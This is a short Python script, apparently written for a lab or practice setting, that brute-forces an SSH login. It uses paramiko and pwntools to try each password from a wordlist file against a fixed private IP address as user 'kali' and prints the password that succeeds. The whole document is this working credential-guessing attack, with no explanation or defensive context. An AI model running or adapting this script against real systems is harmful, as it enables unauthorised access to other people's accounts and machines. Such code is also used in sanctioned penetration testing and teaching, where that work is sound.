import paramiko
from pwn import *

host_ip = '192.168.6.3'
username = 'kali'
attempt = 1
with open('passwords.txt', 'r') as password_list:
    for password in password_list:
        password=password.strip()
        try:
            response = ssh(host=host_ip, user= username, password=password, timeout='2')
            if response.connected():
                print([attempt],'attempting connection')
                print('Connected with password = ', password)
                break
        except paramiko.ssh_exception.AuthenticationException:
            print([attempt], 'attempting connection')
            print("Couldn't connect. Wrong password = ", password)
            attempt+=1